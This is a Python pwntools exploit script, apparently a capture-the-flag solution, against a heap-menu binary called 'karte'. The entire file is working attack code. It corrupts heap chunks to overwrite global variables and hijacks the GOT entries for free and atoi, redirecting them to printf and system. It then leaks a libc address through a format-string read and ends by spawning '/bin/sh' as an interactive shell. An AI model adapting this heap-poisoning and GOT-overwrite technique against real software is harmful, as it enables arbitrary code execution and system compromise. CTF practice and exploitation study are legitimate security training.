from pwn import *
context.log_level = 'debug'

TARGET = './karte'
HOST = ''
PORT = 0

r = process(TARGET)
# r = process(TARGET, env={"LD_PRELOAD":"./libc.so.6"})
# r = remote(HOST, PORT)

gdb.attach(r, '''
c
''')
elf = ELF(TARGET)

def dbg(val): print "\t-> %s: 0x%x" % (val, eval(val))

def add(size, text):
    r.sendline('1')
    r.sendlineafter('> ', str(size))
    r.sendafter('> ', text)
    return int(r.recvuntil('> ').split('id ')[1].split('\n')[0], 10)

def delete(uid):
    r.sendline('3')
    r.sendlineafter('> ', str(uid))
    return r.recvuntil('> ')

def modify(uid, text):
    r.sendline('4')
    r.sendlineafter('> ', str(uid))
    r.sendafter('> ', text)
    return r.recvuntil('> ')

def change_name(name):
    r.sendline('99')
    r.sendlineafter('... ', name)
    r.recvuntil('> ')

lock = 0x602170
key  = 0x602190
name = 0x6021a0

r.sendlineafter('... ', 'NAME')
r.recvuntil('> ')
for i in range(8):
    x = add(0x68, 'A'*0x67)
    delete(x)

id1 = add(0x68, 'A'*0x67)
id2 = add(0x21000, 'C')
id3 = add(0x68, 'B'*0x67)

delete(id1)
delete(id2) # set flag #0
delete(id3)

payload = '\x55\x21\x60\x00' # 1/2?
modify(id3, payload)

id1 = add(0x68, '%13$p') 
payload = 'A' * 3 + p64(elf.got['free']) + p64(0xdeadc0bebeef) # overwrite lock
id2 = add(0x68, payload) 
modify(0x41414100 | id3 & 0xff, p64(elf.plt['printf'])[:-2])

dbg("id1")
dbg("id2")
dbg("id3")

leak = int(delete(id1).split('\n')[0], 16)
base = leak - (0x7fcdf75fdb97-0x00007fcdf75dc000)
system = base + 0x4f440
gadget = [0x4f2c5, 0x4f322, 0x10a38c]
dbg("leak")
dbg("base")

modify(id2, 'AAA' + p64(elf.got['atoi'])[:-5])
modify(0x41414100 | id3 & 0xff, p64(system)[:-2])

r.sendline('/bin/sh')
r.interactive()

